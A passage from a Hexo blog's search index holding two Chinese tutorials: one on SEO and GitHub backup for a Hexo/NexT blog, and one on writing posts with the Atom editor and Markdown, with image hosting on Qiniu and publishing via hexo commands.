<h3 id="0x08-SEO优化"><a href="#0x08-SEO优化" class="headerlink" title="0x08 SEO优化"></a><strong>0x08 SEO优化</strong></h3><p>为了能让 Google 能搜到 blog 中的内容，需要优化站点的 SEO（Search  Engine Optimization）。</p>
<h4 id="1）添加sitemap"><a href="#1）添加sitemap" class="headerlink" title="1）添加sitemap"></a><strong>1）添加sitemap</strong></h4><p>首先 执行 <code>npm install hexo-generator-sitemap --save</code> 安装 sitemap 生成插件，然后在站点配置文件添加如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">##sitemap</div><div class="line">sitemap:</div><div class="line">  path: sitemap.xml</div></pre></td></tr></table></figure></p>
<h4 id="2）添加-robots-txt"><a href="#2）添加-robots-txt" class="headerlink" title="2）添加 robots.txt"></a><strong>2）添加 robots.txt</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># hexo robots.txt</div><div class="line">User-agent: *</div><div class="line">Allow: /</div><div class="line">Allow: /archives/</div><div class="line">Allow: /categories/</div><div class="line">Allow: /about/</div><div class="line">Allow: /tags/</div><div class="line"></div><div class="line">Disallow: /vendors/</div><div class="line">Disallow: /js/</div><div class="line">Disallow: /css/</div><div class="line">Disallow: /fonts/</div><div class="line">Disallow: /vendors/</div><div class="line">Disallow: /fancybox/</div><div class="line"></div><div class="line">Sitemap: http://0x4c43.cn/sitemap.xml</div></pre></td></tr></table></figure>
<h4 id="3）验证-blog-网站"><a href="#3）验证-blog-网站" class="headerlink" title="3）验证 blog 网站"></a><strong>3）验证 blog 网站</strong></h4><p>进入 Google 搜索引擎入口，<code>添加属性 &gt; 备用方法 &gt; HTML 标记</code>，将 Google 的 html 标签，添加到 <code>/themes/next/layout/_partials/head.swig</code> 文件中，重新发布 blog，点击验证。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta name=&quot;google-site-verification&quot; content=&quot;-rILxxxxx7gbfxxxxx-E1VWxxxxxTcq6pxgs_xxxxx&quot; /&gt;</div></pre></td></tr></table></figure></p>
<h4 id="4）收录站点"><a href="#4）收录站点" class="headerlink" title="4）收录站点"></a><strong>4）收录站点</strong></h4><p>点击<code>网址 &gt; 抓取 &gt; 站点地图 &gt; 添加测试站点地图 &gt; 填写sitemap.xml &gt; 提交</code>。大概过一天之后便能通过Google搜索到。</p>
<h4 id="5）给出站链接添加-“nofollow”-标签"><a href="#5）给出站链接添加-“nofollow”-标签" class="headerlink" title="5）给出站链接添加 “nofollow” 标签"></a><strong>5）给出站链接添加 “nofollow” 标签</strong></h4><p>nofollow 标签是由谷歌领头创新的一个 “反垃圾链接” 的标签，并被百度、yahoo 等各大搜索引擎广泛支持，引用 nofollow 标签的目的是：用于指示搜索引擎不要追踪（即抓取）网页上的带有 nofollow 属性的任何出站链接，以减少垃圾链接的分散网站权重。</p>
<p>a．打开<code>/themes/next/layout/_partials/footer.swig</code>，将代码中的a标签加上 rel=”external nofollow”属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;a class=&quot;theme-link&quot; href=&quot;https://hexo.io&quot; rel=&quot;external nofollow&quot;&gt;Hexo&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;a class=&quot;theme-link&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot; rel=&quot;external nofollow&quot;&gt;</div></pre></td></tr></table></figure></p>
<p>b．打开<code>/themes/next/layout/_macro/sidebar.swig</code> 文件，将下面代码中的a标签加上 rel=”external nofollow” 属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;&#123;&#123; link &#125;&#125;&quot; title=&quot;&#123;&#123; name &#125;&#125;&quot; target=&quot;_blank&quot; rel=&quot;external nofollow&quot;&gt;</div><div class="line"></div><div class="line">&lt;a href=&quot;https://creativecommons.org/&#123;% if theme.creative_commons === &apos;zero&apos; %&#125;publicdomain/zero/1.0&#123;% else %&#125;licenses/&#123;&#123; theme.creative_commons &#125;&#125;/4.0&#123;% endif %&#125;/&quot; class=&quot;cc-opacity&quot; target=&quot;_blank&quot; rel=&quot;external nofollow&quot;&gt;</div></pre></td></tr></table></figure></p>
<h4 id="6）添加文章-keywords-和-description"><a href="#6）添加文章-keywords-和-description" class="headerlink" title="6）添加文章 keywords 和 description"></a><strong>6）添加文章 keywords 和 description</strong></h4><p>在<code>\scaffolds\post.md</code> 中添加以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">keywords:</div><div class="line">categories:</div></pre></td></tr></table></figure></p>
<p>新建post的时候添加keywords，会自动转成 <code>&lt;meta name=&quot;keywords&quot; content=&quot;XXX&quot; /&gt;</code>。</p>
<h4 id="7）优化首页-title"><a href="#7）优化首页-title" class="headerlink" title="7）优化首页 title"></a><strong>7）优化首页 title</strong></h4><p>修改<code>\themes\next\layout\index.swig</code>文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125;  &#123;% endblock %&#125;</div><div class="line">改成</div><div class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125; - &#123;&#123; theme.description &#125;&#125;  &#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<h4 id="8）修改网站链接"><a href="#8）修改网站链接" class="headerlink" title="8）修改网站链接"></a><strong>8）修改网站链接</strong></h4><p>编辑站点配置文件，将 url 修改为网站域名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url: http://0x4c43.cn</div></pre></td></tr></table></figure></p>
<h4 id="9）修改文章链接形式"><a href="#9）修改文章链接形式" class="headerlink" title="9）修改文章链接形式"></a><strong>9）修改文章链接形式</strong></h4><p>默认文章链接形式为<code>domain/year/month/day/title</code>，以改成<code>domain/title</code> 的形式，修改站点配置文件中 permalink 字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">permalink: :title/</div></pre></td></tr></table></figure></p>
<h3 id="0x09-Blog备份与恢复"><a href="#0x09-Blog备份与恢复" class="headerlink" title="0x09 Blog备份与恢复"></a><strong>0x09 Blog备份与恢复</strong></h3><p>Hexo blog 发布后，在 github 仓库中只保存有生成的静态文件，而 blog 的源文件：主题和文章等只保存在本地。为了避免电脑出故障导致数据丢失带来的麻烦，可以将源文件备份到 github 上。</p>
<h4 id="1-备份"><a href="#1-备份" class="headerlink" title="1. 备份"></a><strong>1. 备份</strong></h4><p>1）修改.gitignore 文件<br>指定部分文件不备份。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">Thumbs.db</div><div class="line">db.json</div><div class="line">*.log</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">.deploy*/</div><div class="line">.deploy_git</div><div class="line">themes</div></pre></td></tr></table></figure></p>
<p>2）生成 git 仓库<br>在站点根目录下执行 <code>git init</code>。</p>
<p>3）添加远程仓库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git remote add origin https://github.com/0x4C43/0x4C43.github.io.git</div></pre></td></tr></table></figure></p>
<p>4）新建分支<br>在站点根目录下执行 <code>git checkout –b Hexo</code> 新建分支 Hexo 用于备份源文件。</p>
<p>5）添加到本地分支<br>将站点源文件提交到本地 Hexo 分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git add .</div><div class="line">git commit –m “blog”</div></pre></td></tr></table></figure></p>
<p>6）push 到远程分支<br>执行 <code>git push origin Hexo:Hexo</code> 将本地 Hexo 分支推送到远程 Hexo 分支。</p>
<p>注：push 操作时出现错误及解决方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">error: unable to create directory for .git/logs/refs/remotes/origin/Hexo</div><div class="line">error: Cannot update the ref &apos;refs/remotes/origin/Hexo&apos;.</div><div class="line">solution:</div><div class="line">sudo chown -R username .</div></pre></td></tr></table></figure></p>
<p>7）成功备份<br>之后写文章之后都先备份，再发布。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git add .</div><div class="line">git commit –m “blog”</div><div class="line">git push origin Hexo:Hexo</div><div class="line"></div><div class="line">git clean</div><div class="line">git d -g</div></pre></td></tr></table></figure></p>
<h4 id="2-恢复"><a href="#2-恢复" class="headerlink" title="2. 恢复"></a><strong>2. 恢复</strong></h4><p>当需要在另一台电脑上写 blog 时，可以通过以下方式恢复 Hexo 环境。<br>1）下载 Node.js 并安装<br>2）下载安装git<br>3）下载安装hexo<br>4）恢复源文件<br>通过 Git 克隆备份的 blog：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git@github.com:0x4C43/0x4C43.github.io.git</div></pre></td></tr></table></figure></p>
<p>5）切换到Hexo分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout  Hexo</div></pre></td></tr></table></figure></p>
<p>6）安装 git 部署插件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-deployer-git</div></pre></td></tr></table></figure></p>
<p>之后就可以更新 blog 了。</p>
<h3 id="0x09-备份Next主题"><a href="#0x09-备份Next主题" class="headerlink" title="0x09 备份Next主题"></a><strong>0x09 备份Next主题</strong></h3><h4 id="1）将主题-fork-到自己仓库"><a href="#1）将主题-fork-到自己仓库" class="headerlink" title="1）将主题 fork 到自己仓库"></a><strong>1）将主题 fork 到自己仓库</strong></h4><h4 id="2）获取主题"><a href="#2）获取主题" class="headerlink" title="2）获取主题"></a><strong>2）获取主题</strong></h4><p>执行以下命令下载主题到本地。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git submolule add git@github.com:0x4C43/hexo-theme-next.git</div></pre></td></tr></table></figure></p>
<h4 id="3）push-到远程分支"><a href="#3）push-到远程分支" class="headerlink" title="3）push 到远程分支"></a><strong>3）push 到远程分支</strong></h4><p>将修改好主题后 push 到远程分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git commit -am &quot;update theme&quot;</div><div class="line">git push origin</div></pre></td></tr></table></figure></p>
<h4 id="4）恢复主题"><a href="#4）恢复主题" class="headerlink" title="4）恢复主题"></a><strong>4）恢复主题</strong></h4><p>在需要恢复主题时，执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule init</div><div class="line">git submodule update</div></pre></td></tr></table></figure></p>
<hr>
<p>Reference:<br>[1] Hexo 官方文档：<a href="https://hexo.io/zh-cn/docs/setup.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/setup.html</a><br>[2] NexT 主题官网：<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">http://theme-next.iissnan.com/</a><br>[3] Hexo-GitHub Page 博客绑定域名：<a href="http://ccxxmd.me/2017/03/04/Blog_domainname/" target="_blank" rel="external">http://ccxxmd.me/2017/03/04/Blog_domainname/</a><br>[4] 推荐网易云跟帖：<a href="https://blog.vadxq.com/dstogentie/" target="_blank" rel="external">https://blog.vadxq.com/dstogentie/</a><br>[5] Hexo Next 主题 SEO 优化：<a href="http://fanjun.im/2016/09/hexo_next_seo.html" target="_blank" rel="external">http://fanjun.im/2016/09/hexo_next_seo.html</a><br>[6] Hexo 博客备份：<a href="http://nhsensation.xyz/2016/03/14/move-blog/" target="_blank" rel="external">http://nhsensation.xyz/2016/03/14/move-blog/</a><br>[7] 备份 Hexo 源文件至 GitHub：<a href="http://www.leyar.me/backup-your-blog-to-github/" target="_blank" rel="external">http://www.leyar.me/backup-your-blog-to-github/</a></p>
]]></content>
      
        <categories>
            
            <category> others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Next </tag>
            
            <tag> Github </tag>
            
            <tag> 域名绑定 </tag>
            
            <tag> SEO优化 </tag>
            
            <tag> Blog备份 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Atom+Markdown写文章]]></title>
      <url>/%E4%BD%BF%E7%94%A8Atom+Markdown%E5%86%99%E6%96%87%E7%AB%A0/</url>
      <content type="html"><![CDATA[<h3 id="0x01-Atom"><a href="#0x01-Atom" class="headerlink" title="0x01 Atom"></a><strong>0x01 Atom</strong></h3><p>Atom 是 Github 推出的一个开源跨平台文本编辑器。具有简洁和直观的图形用户界面，支持 CSS、HTML、JavaScript 等网页编程语言。 并且支持宏和自动分屏等功能，还集成了文件管理器。同时，Atom 也支持 Markdown 语法，所以可以很方便地写 Hexo blog。</p>
<p>可以在官网下载<a href="https://atom.io/" target="_blank" rel="external">Atom</a>。</p>
<h4 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a><strong>常用快捷键</strong></h4><p>在File/Settings/Keybindiigns下定义了大量快捷键，常用快捷键如下:</p>
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Crtl+Shift+M</td>
<td style="text-align:left">开启Markdown实时预览</td>
</tr>
<tr>
<td style="text-align:left">Command+Shift+P</td>
<td style="text-align:left">打开命令窗口，可以运行各种菜单功能</td>
</tr>
<tr>
<td style="text-align:left">Command + T</td>
<td style="text-align:left">多文件切换</td>
</tr>
<tr>
<td style="text-align:left">Command + F</td>
<td style="text-align:left">文件内查找和替换</td>
</tr>
<tr>
<td style="text-align:left">Command + Shift + F</td>
<td style="text-align:left">多文件查找和替换</td>
</tr>
<tr>
<td style="text-align:left">Command + [</td>
<td style="text-align:left">对选中内容向左缩进</td>
</tr>
<tr>
<td style="text-align:left">Command + ]</td>
<td style="text-align:left">对选中内容向右缩进</td>
</tr>
<tr>
<td style="text-align:left">Command + \</td>
<td style="text-align:left">显示或隐藏目录树</td>
</tr>
<tr>
<td style="text-align:left">Crtl + m</td>
<td style="text-align:left">括号之间/HTML tag之间等跳转</td>
</tr>
</tbody>
</table>
<h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a><strong>插件</strong></h4><p>Atom 支持插件扩展，下面列举一些实用的插件。点击File/Settings/Install，输入相应的插件名称进行安装。</p>
<ul>
<li><p>增强预览(markdown-preview-plus)<br>需要关闭系统自带的markdown-preview，Ctrl+Shift+M 打开预览窗口。</p>
</li>
<li><p>实时滚动预览(markdown-scroll-sync)<br>预览窗口将跟随编辑界面的鼠标移动，可实时查看效果。</p>
</li>
<li><p>格式化代码(atom-beautify)   </p>
</li>
<li><p>表格编辑(markdown-table-editor)<br>输入 table，然后按 Tab 键将自动输出表格样式。</p>
</li>
<li><p>导出pdf/png/jpeg/html(markdown-themeable-pdf)<br>在文章编辑区域单击右键，Markdown to PDF。若要导出其它格式，在File/Settings/packeages/markdown-themeable-pdf/Settings 中进行设置。</p>
</li>
<li><p>博客支持(markdown-Writer)</p>
</li>
</ul>
<h3 id="0x02-Markdown-常用语法"><a href="#0x02-Markdown-常用语法" class="headerlink" title="0x02 Markdown 常用语法"></a><strong>0x02 Markdown 常用语法</strong></h3><blockquote>
<p>Markdown 是一种轻量级标记语言，它允许人们 “易读易写的纯文本格式编写文档，然后转换成有效的XHTML(或者HTML)文档”。Markdown 最重要的设计是可读性，能直接在字面上的被阅读，而不用被一些格式化指令标记 (如 RTF 与 HTML)。 因此，它是现行电子邮件标记格式的惯例，虽然它也借鉴了很多早期的标记语言，如：setext、Texile、reStructuredText。 — wikipedia</p>
</blockquote>
<h4 id="换行"><a href="#换行" class="headerlink" title="换行"></a><strong>换行</strong></h4><p>在行尾输入两个以上的空格然后回车。</p>
<h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a><strong>标题</strong></h4><p>在标题内容前输入特定数量的’#’来实现对应级别的HTML样式的标题(HTML提供六级标题)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">## 这是 H1</div><div class="line">### 这是 H2</div><div class="line">###### 这是 H6</div></pre></td></tr></table></figure></p>
<h4 id="区块引用"><a href="#区块引用" class="headerlink" title="区块引用"></a><strong>区块引用</strong></h4><p>在引用内容的每行或者是段首加 ‘&gt;’，引用块中可以根据层次加上不同数量的 ‘&gt;’进行嵌套引用。 同时，引用区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; #### This is a blockquote with paragraphs.</div></pre></td></tr></table></figure></p>
<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a><strong>列表</strong></h4><p>Markdown 支持有序列表和无序列表。<br>无序列表使用 ‘*‘、’+’ 或是 ‘-‘ 作为列表标记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-   Red   </div><div class="line">-   Green   </div><div class="line">-   Blue</div></pre></td></tr></table></figure></p>
<p>有序列表则使用数字接着一个英文句点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.  Bird</div><div class="line">2.  McHale</div><div class="line">3.  Parish</div></pre></td></tr></table></figure></p>
<p>当文章内容刚好行首出现数字-句点-空白时，不希望解析为有序列表，可以在句点前面加上反斜杠。</p>
<h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a><strong>代码块</strong></h4><p>在代码块的每行前面加 4 个空格或是 1 个制表符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这是一个普通段落：</div><div class="line">    这是一个代码区块。</div></pre></td></tr></table></figure></p>
<p>当代码量较大时可以用三个反引号包围 ```。在代码块中添加一个可选的语言标识符,可以根据语法高亮显示，例如：  </p>
<pre>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="built_in">printf</span> (<span class="string">"Hello World!"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</pre>

<p>如果要标记一小段行内代码，可以用反引号``，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Use the `printf()` function.</div></pre></td></tr></table></figure></p>
<h4 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a><strong>分割线</strong></h4><p>在一行中用三个以上的 ‘*‘ 或 ‘-‘ 来建立个分割线，在符号中间可以插入空格。下面是几种正确的写法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">* * *</div><div class="line">***</div><div class="line">*****</div><div class="line">- - -</div><div class="line">---------------------------------------</div></pre></td></tr></table></figure></p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a><strong>链接</strong></h4><p>链接文字用 [方括号] 标记，方块括号后面圆括号中为网址链接（也可以是相对路径），网址后面双引号中的内容为链接的 title，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">This is [an example](http://example.com/ &quot;Title&quot;) inline link.</div><div class="line">[This link](http://example.net/) has no title attribute.</div></pre></td></tr></table></figure></p>
<h4 id="强调"><a href="#强调" class="headerlink" title="强调"></a><strong>强调</strong></h4><p>Markdown 使用 ‘*‘ 或 ‘_‘ 作为标记强调字词的符号。首尾各一个为斜体，首尾各两个为加粗。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">*single asterisks*</div><div class="line">_single underscores_</div><div class="line">**double asterisks**</div><div class="line">__double underscores__</div></pre></td></tr></table></figure></p>
<h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a><strong>图片</strong></h4><p>Markdown 使用与链接相似的语法来标记图片，方括号内为图片的替代文字，圆括号内为图片地址，同样也可以加上 title。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![Alt text](/path/to/img.jpg &quot;Title&quot;)</div></pre></td></tr></table></figure></p>
<h4 id="自动链接"><a href="#自动链接" class="headerlink" title="自动链接"></a><strong>自动链接</strong></h4><p>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用方括号包起来， Markdown 就会自动把它转成链接。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;http://example.com/&gt;</div></pre></td></tr></table></figure></p>
<h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a><strong>表格</strong></h4><p>在安装 markdown-table-editor 插件之后可以很方便的编辑表格，输入table,按 Tab 键就会出现表格样式。注意在表格之前要空一行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">| Header One | Header Two |</div><div class="line">|:---------- |:---------- |</div><div class="line">| Item One   | Item Two   |</div></pre></td></tr></table></figure></p>
<p>默认标题栏居中对齐，内容居左对齐。<br>-: 表示内容和标题栏靠右对齐，:- 表示内容和标题栏靠左对齐，:-: 表示内容和标题栏居中对齐。</p>
<h3 id="0x03-插入图片"><a href="#0x03-插入图片" class="headerlink" title="0x03 插入图片"></a><strong>0x03 插入图片</strong></h3><p>用 Markdown 写文章有个麻烦的地方就是不能直接插图片，通常需要将图片放在本地或者云上，然后在文章中通过图片链接（相对地址或网址）来插图片。为了节省 Blog 的空间，将图片上传到<a href="https://www.qiniu.com/" target="_blank" rel="external">七牛云</a>上。   </p>
<h4 id="1）注册账号并登录"><a href="#1）注册账号并登录" class="headerlink" title="1）注册账号并登录"></a><strong>1）注册账号并登录</strong></h4><h4 id="2）新建-buket"><a href="#2）新建-buket" class="headerlink" title="2）新建 buket"></a><strong>2）新建 buket</strong></h4><p>对象存储 &gt; 新建存储空间，输入相关信息。   </p>
<h4 id="3）极简图床-Chrome-插件"><a href="#3）极简图床-Chrome-插件" class="headerlink" title="3）极简图床 Chrome 插件"></a><strong>3）极简图床 Chrome 插件</strong></h4><p>使用极简图床可以绑定七牛云存储空间，然后可以通过拖拽的方式上传图片到云上。绑定七牛云需要空间名称、AK、SK 和域名。</p>
<div align="center"><br>  <img src="http://ooyovxue7.bkt.clouddn.com/17-4-26/26825806-file_1493208795361_1da.png?imageMogr2/thumbnail/!80p"><br></div>

<h4 id="4）插入图片"><a href="#4）插入图片" class="headerlink" title="4）插入图片"></a><strong>4）插入图片</strong></h4><p>在文章中使用以下语法插入图片。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">![](image_link)</div><div class="line"></div><div class="line">&lt;div align=center&gt;  # 图片居中</div><div class="line">  &lt;img src= &quot;url&quot;/&gt;</div><div class="line">&lt;/div &gt;</div><div class="line"></div><div class="line">&lt;img src=&quot;url?imageMogr2/thumbnail/!60p&quot;/&gt;  # 七牛云图片缩放</div></pre></td></tr></table></figure></p>
<h3 id="0x04-文章发布"><a href="#0x04-文章发布" class="headerlink" title="0x04 文章发布"></a><strong>0x04 文章发布</strong></h3><p>在搭建好 Hexo Blog 之后，可以通过以下步骤新建并发布一篇新的文章。</p>
<h4 id="1）创建文章"><a href="#1）创建文章" class="headerlink" title="1）创建文章"></a><strong>1）创建文章</strong></h4><p>执行下列命令来创建一篇新文章。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo new post &lt;title&gt;</div></pre></td></tr></table></figure></p>
<h4 id="2）撰写文章"><a href="#2）撰写文章" class="headerlink" title="2）撰写文章"></a><strong>2）撰写文章</strong></h4><p>使用 Atom 和 Markdown 语法写文章内容。</p>
<h4 id="3）发布文章"><a href="#3）发布文章" class="headerlink" title="3）发布文章"></a><strong>3）发布文章</strong></h4><p>首先需要生成静态文件，然后部署到Hexo中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo clean  # 清除缓存文件 (db.json) 和已生成的静态文件 (public)</div><div class="line">hexo g      # 生成静态文件</div><div class="line">hexo d      # 部署网站</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] Markdown 官网语法说明：<a href="http://www.markdown.cn/" target="_blank" rel="external">http://www.markdown.cn/</a></p>
]]></content>
      
        <categories>
            
            <category> others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Atom </tag>
            
            <tag> Markdown </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
